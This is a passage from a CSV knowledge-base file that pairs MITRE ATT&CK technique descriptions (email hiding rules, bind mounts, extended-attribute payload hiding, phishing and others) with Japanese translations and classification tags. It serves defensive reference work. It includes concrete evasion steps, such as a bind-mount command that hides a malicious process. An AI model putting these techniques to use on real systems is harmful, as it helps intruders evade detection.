2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",攻撃者は、侵害されたユーザーのメールボックス内で受信メールを隠蔽するためにメールルールを利用する場合があります。多くのメールクライアントでは、メールを他のフォルダーに移動する、既読にする、削除するなどの様々な機能に対して受信トレイルールを作成できます。 ルールはメールクライアント内で作成・変更できるほか、Windowsシステムでは<code>New-InboxRule</code>や<code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドレットなどの外部機能を通じて設定可能です。(引用元: Microsoft Inbox Rules)(引用元: MacOS Email Rules)(引用元: Microsoft New-InboxRule)(引用元: Microsoft Set-InboxRule) 攻撃者は、侵害されたユーザーのメールボックス内のメールルールを利用して、メールを削除したり、目立たないフォルダーに移動したりすることがあります。攻撃者は、セキュリティアラート、C2通信、または侵害されたアカウントから送信された[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)メールへの返信を隠すためにこれを行う可能性があります。 組織内のユーザーや管理者（または有効な認証情報を持つ攻撃者）は、メールを自動的に移動または削除するルールを作成できる可能性があります。これらのルールは、メールの内容がユーザーや防御者によって即座に確認される場合、検知を妨害/遅延させるために悪用される可能性があります。 悪意のあるルールは、メッセージ本文や件名に含まれるキーワード（例：<code>マルウェア</code>、<code>不審</code>、<code>フィッシング</code>、<code>ハッキング</code>）に基づいてメールをフィルタリングするのが一般的です。（出典：Microsoft Cloud App Security）環境によっては、管理者が個々の受信箱ではなく組織全体で動作するメールルールを有効化できる場合があります。 例えば、Microsoft Exchange はトランスポートルールをサポートしており、組織が受信する全メールをユーザー指定の条件で評価し、条件に合致するメールに対してユーザー指定のアクションを実行します。（引用元：Microsoft Mail Flow Rules 2023）このような機能を悪用する攻撃者は、特定のトピック（内部セキュリティインシデント通知など）に関連する全メールを自動的に変更または削除できる可能性があります。,defense-evasion,Windows;Linux;macOS;Office Suite,credential_abuse,stealth,authentication_system;privileged_account;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff,2021-06-07T13:20:23.767Z,2025-04-15T22:27:09.849Z,,,,
T1564.009,T1564,Resource Forking,リソースフォーク,"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes) Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)",攻撃者は、検出回避やセキュリティアプリケーションの迂回を目的として、悪意のあるコードや実行ファイルをリソースフォークに隠蔽する可能性があります。 リソースフォークは、サムネイル画像、メニュー定義、アイコン、ダイアログボックス、コードなどのリソースを構造化して保存する手段をアプリケーションに提供します。（引用元：macOS階層ファイルシステム概要）リソースフォークの使用は、<code>ls -l@</code> または <code>xattr -l</code> コマンドでファイルの拡張属性を表示することで識別可能です。リソースフォークは非推奨となり、アプリケーションバンドル構造に置き換えられています。 非ローカライズされたリソースはアプリケーションバンドルの最上位ディレクトリに配置され、ローカライズされたリソースは<code>/Resources</code>フォルダに配置されます。(引用: リソースフォークとデータフォーク)(引用: ELC拡張属性) 攻撃者はリソースフォークを利用して、ファイルに直接保存される可能性のある悪意のあるデータを隠蔽できます。 攻撃者は、リソースフォークを添付したコンテンツを、指定されたオフセットで実行可能な場所に移動し、呼び出すことで実行できます。リソースフォークのコンテンツは、実行時まで難読化/暗号化されている場合もあります。(引用: sentinellabs resource named fork 2020)(引用: tau bundlore erika noerenberg 2020),defense-evasion,macOS,script_command_execution,stealth,endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--b22e5153-ac28-4cc6-865c-2054e36285cb,2021-10-12T20:02:31.866Z,2025-04-16T20:37:19.185Z,,,,
T1564.010,T1564,Process Argument Spoofing,プロセス引数偽装,"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019) Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020) Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021) This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",攻撃者はプロセスメモリを上書きすることで、プロセスのコマンドライン引数を隠蔽しようとする可能性がある。プロセスのコマンドライン引数は、プロセス環境ブロック（PEB）に格納される。PEBはWindowsがプロセスに関する様々な情報を保存するために使用するデータ構造であり、プロセス実行時に参照されるコマンドライン引数を含む。プロセス生成時に、プロセス生成を監視する防御ツール/センサーはPEBから引数を取得する可能性がある。(引用: Microsoft PEB 2021)(引用: Xpn Argue Like Cobalt 2019) 攻撃者は防御を回避するためプロセスPEBを操作する可能性がある。例えば、[プロセスホローイング](https://attack.mitre.org/techniques/T1055/012)を悪用し、無害な引数を持つサスペンド状態のプロセスを生成できる。 プロセス生成後、PEBが初期化され（ツール/センサーによるプロセス情報記録の可能性あり）、攻撃者はPEBを上書きしてコマンドライン引数を改変（例：[ネイティブAPI](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code>関数使用）し、悪意のある引数でプロセス実行を再開する可能性があります。(引用: Cobalt Strike Arguments 2019)(引用: Xpn Argue Like Cobalt 2019)(引用: Nviso Spoof Command Line 2020) 攻撃者はまた、悪意のあるコマンドライン引数でプロセスを実行した後、メモリを無害な引数でパッチし、その後のプロセスメモリ分析を回避する可能性があります。(引用: FireEye FiveHands 2021年4月) この動作は、プロセスベースの検出を操作またはさらに回避するために、他の手法（[親PIDの偽装](https://attack.mitre.org/techniques/T1134/004)など）と組み合わせる場合もあります。,defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ffe59ad3-ad9b-4b9f-b74f-5beb3c309dc1,2021-11-19T14:13:11.335Z,2025-04-25T14:48:40.519Z,,,,
T1564.011,T1564,Ignore Process Interrupts,プロセス割り込みの無視,"Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.(Citation: Linux Signal Man) These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups.(Citation: nohup Linux Man)(Citation: Microsoft PowerShell SilentlyContinue) This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection. Hiding from process interrupt signals may allow malware to continue execution, but unlike [Trap](https://attack.mitre.org/techniques/T1546/005) this does not establish [Persistence](https://attack.mitre.org/tactics/TA0003) since the process will not be re-invoked once actually terminated.",攻撃者は、プロセス割り込み信号から隠れるコマンドを実行することで防御機構を回避する可能性がある。多くのOSはプロセス制御メッセージを伝達するために信号を使用する。コマンドインタプリタは、アクティブセッションのユーザーがログオフした場合など、エラーやその他の異常を無視する特定のコマンド/フラグをしばしば含む。(出典: Linux Signal Man) これらの割り込み信号は、防御ツールやアナリストが特定の実行中プロセスを一時停止または終了させるためにも使用される。 攻撃者は`nohup`、[PowerShell](https://attack.mitre.org/techniques/T1059/001)の`-ErrorAction SilentlyContinue`、あるいは同様のハングアップの影響を受けないコマンドを使用してプロセスを起動する可能性がある。(引用元: nohup Linux Man)(引用元: Microsoft PowerShell SilentlyContinue) これにより、悪意のあるコマンドやマルウェアは、ユーザーログオフやC2ネットワーク接続の切断など、通常は実行を終了させるシステムイベントを通しても実行を継続できる可能性があります。 プロセス中断シグナルからの隠蔽により、マルウェアは実行を継続できる場合がありますが、[Trap](https://attack.mitre.org/techniques/T1546/005) とは異なり、プロセスが実際に終了すると再起動されないため、[Persistence](https://attack.mitre.org/tactics/TA0003) は確立されません。,defense-evasion,Linux;macOS;Windows,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--4a2975db-414e-4c0c-bd92-775987514b4b,2023-08-24T17:23:34.470Z,2025-04-15T22:41:11.807Z,,,,
T1564.012,T1564,File/Path Exclusions,ファイル/パス除外,"Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions) Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",攻撃者は、アンチウイルス（AV）スキャンやその他の防御機能から除外された特定のフォルダやファイル名にファイルベースのアーティファクトを書き込むことで、それらを隠蔽しようとする可能性があります。AVやその他のファイルベーススキャナは、パフォーマンスの最適化やアプリケーションのインストール・正当な使用の容易化のために除外設定を頻繁に含みます。 これらの除外は状況依存（例：特定トリガーイベント/アラートへの応答時のみスキャン開始）の場合もあるが、信頼性・正当性が前提とされる特定フォルダやファイルを参照するハードコード文字列であることも多い（引用元：Microsoft File Folder Exclusions）。攻撃者はこれらの除外を悪用し、ファイルベースのアーティファクトを隠蔽する可能性がある。 例えば、ツール設定を改ざんして新しい除外を追加する（すなわち、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)）代わりに、攻撃者はデフォルトまたはよく知られた除外対象にファイルベースのペイロードを配置することがあります。 また攻撃者は、[セキュリティソフトウェア検出](https://attack.mitre.org/techniques/T1518/001)やその他の[偵察](https://attack.mitre.org/tactics/TA0007)/[偵察](https://attack.mitre.org/tactics/TA0043)活動を用いて、被害者環境内の既存除外設定を発見・検証する可能性があります。,defense-evasion,Linux;macOS;Windows,config_policy_manipulation,stealth,file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9,2024-03-29T16:59:10.374Z,2025-04-15T22:35:31.731Z,,,,
T1564.013,T1564,Bind Mounts,バインドマウント,"Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It’s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access. Adversaries may use bind mounts to map either an empty directory or a benign `/proc` directory to a malicious process’s `/proc` directory. Using the commands `mount –o bind /proc/benign-process /proc/malicious-process` (or `mount –B`), the malicious process's `/proc` directory is overlayed with the contents of a benign process's `/proc` directory. When system utilities query process activity, such as `ps` and `top`, the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual `/proc` directory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection.(Citation: Cado Security Commando Cat 2024)(Citation: Ahn Lab CoinMiner 2023)",攻撃者は、ファイル構造上のバインドマウントを悪用し、ネイティブユーティリティから自身の活動や痕跡を隠蔽することがある。バインドマウントは、ファイルシステム上のディレクトリやファイルを別の場所にマッピングするもので、Windowsのショートカットに類似する。コンテナ内やchroot環境など、異なる環境間で特定のファイルやディレクトリへのアクセスを提供するために一般的に使用され、sudoアクセスを必要とする。 攻撃者はバインドマウントを利用し、空のディレクトリまたは無害な`/proc`ディレクトリを悪意のあるプロセスの`/proc`ディレクトリにマッピングすることがある。`mount –o bind /proc/benign-process /proc/malicious-process`（または`mount –B`）コマンドを使用すると、悪意のあるプロセスの`/proc`ディレクトリが無害なプロセスの`/proc`ディレクトリの内容で上書きされる。 `ps`や`top`などのシステムユーティリティがプロセス活動を照会する際、カーネルはバインドマウントを追跡し、悪意のあるプロセスの実際の`/proc`ディレクトリではなく、無害なディレクトリの内容を表示します。 その結果、これらのユーティリティは良性プロセスからの情報のように見える情報を表示し、悪意のあるプロセスのメタデータ、実行ファイル、その他の痕跡を効果的に検出から隠蔽します。(引用: Cado Security Commando Cat 2024)(引用: Ahn Lab CoinMiner 2023),defense-evasion,Linux,script_command_execution,stealth,privileged_account;endpoint_execution;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--5bd41255-a224-4425-a2e2-e9d293eafe1c,2025-01-30T21:01:16.340Z,2025-04-15T19:58:34.469Z,,,,
T1564.014,T1564,Extended Attributes,拡張属性,"Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`, `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with `com.apple.*` (e.g., `com.apple.quarantine`, `com.apple.metadata:_kMDItemUserTags`) and used by system features like Gatekeeper and Spotlight.(Citation: Establishing persistence using extended attributes on Linux) An adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the `xattr` command. A separate loader can retrieve the attribute with `xattr -p`, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use `setfattr` to write a payload into the `user.` namespace of a legitimate file. A loader script can later extract the payload with `getfattr --only-values`, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.(Citation: Low GroupIB xattrs nov 2024)",攻撃者は、検出回避のために悪意のあるデータを隠蔽する目的で、macOSおよびLinuxの拡張属性（xattrs）を悪用する可能性があります。拡張属性は、macOSとLinuxの両方で使用されるファイルおよびディレクトリメタデータのキーと値のペアです。これらは`Finder`、`ls`、`cat`などの標準ツールでは表示されず、`xattr`（macOS）や`getfattr`（Linux）などのユーティリティを使用して検査する必要があります。 オペレーティングシステムやアプリケーションは、タグ付け、整合性チェック、アクセス制御のためにxattrsを使用します。Linuxでは、xattrsは`user.`（ユーザー権限）、`trusted.`（root権限）、`security.`、`system.`などの名前空間に整理され、それぞれ固有の権限が設定されています。 macOSでは、xattrは名前空間プレフィックスのない平文の文字列であり、一般的に`com.apple.*`（例：`com.apple.quarantine`、`com.apple.metadata:_kMDItemUserTags`）でプレフィックスされ、GatekeeperやSpotlightなどのシステム機能で使用されます。（引用元: Establishing persistence using extended attributes on Linux）攻撃者は、正当なファイルの拡張属性に第二段階のペイロードを埋め込むことでxattrを悪用する可能性があります。 macOSでは、`xattr`コマンドを使用してカスタム属性にペイロードを埋め込めます。別のローダーが`xattr -p`で属性を取得し、内容をデコードしてスクリプトインタプリタで実行します。Linuxでは、攻撃者が`setfattr`を使用して正当なファイルの`user.`名前空間にペイロードを書き込む可能性があります。 ローダースクリプトは後で`getfattr --only-values`でペイロードを抽出し、デコードしてbashなどのインタプリタで実行できる。いずれの場合も、主ファイルの内容は変更されないため、拡張属性を検査しないセキュリティツールや整合性チェックは元のファイルハッシュを認識し、悪意のあるペイロードは検出を回避できる。(引用: Low GroupIB xattrs nov 2024),defense-evasion,Linux;macOS,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--762e6f29-a62f-4d96-91ed-d0073181431f,2025-03-27T19:40:00.716Z,2025-04-15T19:58:42.110Z,,,,
T1565,,Data Manipulation,データ操作,"Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",攻撃者は外部結果に影響を与えたり活動を隠蔽したりするため、データの挿入・削除・改ざんを行い、データの完全性を脅かす可能性がある。(出典: Sygnia Elephant Beetle Jan 2022) データ操作により、攻撃者は業務プロセス、組織の認識、意思決定に影響を与えようとする。改ざんの種類と影響は、標的となるアプリケーションやプロセス、攻撃者の目的によって異なる。 複雑なシステムの場合、攻撃者は望ましい影響を得るために、通常は長期にわたる情報収集活動を通じて得られる、システムに関連する専門知識や専用ソフトウェアへのアクセスを必要とする可能性が高い。,impact,Linux;macOS;Windows,destructive_impact,impact,endpoint_execution,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931,2020-03-02T14:19:22.609Z,2025-04-15T22:14:59.144Z,,,,
T1565.001,T1565,Stored Data Manipulation,保存データの改ざん,"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",敵対者は、外部への影響力を行使したり活動を隠蔽したりするために、保存状態のデータを挿入、削除、または操作し、データの完全性を脅かす可能性がある。（引用元：FireEye APT38 2018年10月）（引用元：DOJ Lazarus Sony 2018）保存データの操作により、敵対者は業務プロセス、組織の理解、意思決定に影響を与えようとする可能性がある。 保存データには、Officeファイル、データベース、保存メール、カスタムファイル形式など、様々なファイル形式が含まれる可能性がある。改変の種類とそれが及ぼす影響は、データの種類と敵対者の目標・目的に依存する。複雑なシステムの場合、敵対者は通常、望ましい影響を与えるために、長期にわたる情報収集活動を通じて得られる、システムに関連する専門知識およびおそらくは専用ソフトウェアへのアクセスを必要とするだろう。,impact,Linux;macOS;Windows,destructive_impact,impact,user_interaction;endpoint_execution;email_infrastructure;file_storage_access;database_access,specified,Business Workstation;File Server;Mail / Collaboration;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292,2020-03-02T14:22:24.410Z,2025-04-15T23:13:20.667Z,,,,
T1565.002,T1565,Transmitted Data Manipulation,伝送データ改ざん,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",敵対者は、外部への結果を操作したり活動を隠蔽したりするために、ストレージや他のシステムへの転送途中のデータを改変し、データの完全性を脅かす可能性がある。（引用元：FireEye APT38 2018年10月）（引用元：DOJ Lazarus Sony 2018）送信データを操作することで、敵対者は業務プロセス、組織の理解、意思決定に影響を与えようとする可能性がある。 操作は、情報を傍受・変更するツールを展開する機会があるネットワーク接続上、またはシステムプロセス間で可能となる。改変の種類と影響は、標的となる伝送メカニズムと敵対者の目的・目標に依存する。複雑なシステムの場合、敵対者は通常、望ましい影響を得るために長期にわたる情報収集活動を通じて得られる、システム関連の専門知識および特殊ソフトウェアへのアクセスを必要とする可能性が高い。,impact,Linux;macOS;Windows,destructive_impact,impact,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6,2020-03-02T14:27:00.693Z,2025-04-15T23:16:50.965Z,,,,
T1565.003,T1565,Runtime Data Manipulation,実行時データ操作,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",攻撃者は、エンドユーザーがアクセスし表示するデータを操作するためにシステムを変更し、データの完全性を脅かす可能性がある。（引用元：FireEye APT38 2018年10月）（引用元：DOJ Lazarus Sony 2018）実行時データを操作することで、攻撃者はビジネスプロセス、組織の理解、意思決定に影響を与えようとする可能性がある。 敵対者は、実行時操作を引き起こすために、データ表示に使用されるアプリケーションバイナリを変更する可能性がある。また、同様の効果を得るために、[デフォルトのファイル関連付けの変更](https://attack.mitre.org/techniques/T1546/001)や[偽装](https://attack.mitre.org/techniques/T1036)を行う場合もある。 改変の種類と影響は、標的となるアプリケーションやプロセス、ならびに攻撃者の目的によって異なります。複雑なシステムの場合、攻撃者は通常、長期にわたる情報収集活動を通じて得られる、システム関連の専門知識や専用ソフトウェアへのアクセスを必要とし、それによって望ましい影響を及ぼすことが可能となります。,impact,Linux;macOS;Windows,destructive_impact,impact,authentication_system;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490,2020-03-02T14:30:05.252Z,2025-04-15T23:01:11.644Z,,,,
T1566,,Phishing,フィッシング,"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., ""thread hijacking"").(Citation: phishing-krebs) Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",攻撃者は被害者システムへのアクセスを得るためフィッシングメッセージを送信する。あらゆる形態のフィッシングは電子的に配信されるソーシャルエンジニアリングである。標的型フィッシング（スピアフィッシング）では、特定の個人・企業・業界が攻撃対象となる。 より一般的な手法として、大量マルウェアスパムキャンペーンなど、非標的型フィッシングも存在する。敵対者は被害者に悪意のある添付ファイルやリンクを含むメールを送信し、通常は被害者システム上で悪意のあるコードを実行させる。フィッシングはソーシャルメディアプラットフォームなどの第三者サービス経由でも実施される。 フィッシングには、信頼できる送信者を装うソーシャルエンジニアリング手法に加え、悪用されている侵害済みアカウントから送信されるメールやメタデータ/ヘッダーを削除・改ざんする回避手法も含まれる（例：[Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)）。(引用: Microsoft OAuth Spam 2022)(引用: Palo Alto Unit 42 VBA Infostealer 2014) これを達成する別の方法は、[メールスプーフィング](https://attack.mitre.org/techniques/T1672) である。(引用元: Proofpoint-spoof) 送信者IDを偽装することで、人間の受信者と自動セキュリティツールの両方を欺くことが可能です。(引用元: cyberproof-double-bounce) あるいは、悪意のあるファイルやリンクを含む既存のメールスレッドに標的を参加者として追加する手法（いわゆる「スレッドハイジャック」）も用いられます。(引用元: phishing-krebs) 被害者は、悪意のあるURLへのアクセスやマルウェアのダウンロードを指示する電話番号への連絡を求めるフィッシングメッセージを受け取る場合もあります。(引用元: sygnia Luna Month)（引用元：CISA Remote Monitoring and Management Software）または攻撃者がアクセス可能なリモート管理ツールを自身のコンピュータにインストールするよう指示するフィッシングメッセージを受け取る場合もある（すなわち、[ユーザー実行](https://attack.mitre.org/techniques/T1204)）。（引用元：Unit42 Luna Moth）,initial-access,Linux;macOS;Windows;SaaS;Identity Provider;Office Suite,config_policy_manipulation,entry,authentication_system;identity_federation;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;file_storage_access;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b,2020-03-02T18:45:07.892Z,2025-04-15T19:58:55.739Z,,,,
T1566.001,T1566,Spearphishing Attachment,スピアフィッシング添付ファイル,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source. There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",攻撃者は被害者システムへのアクセスを得るため、悪意のある添付ファイルを伴うスピアフィッシングメールを送信することがある。添付ファイル型スピアフィッシングはスピアフィッシングの特定亜種である。メールに添付されたマルウェアを利用するという点で、他の形態のスピアフィッシングとは異なる。あらゆる形態のスピアフィッシングは、特定の個人・企業・業界を標的とした電子的に配信されるソーシャルエンジニアリングである。 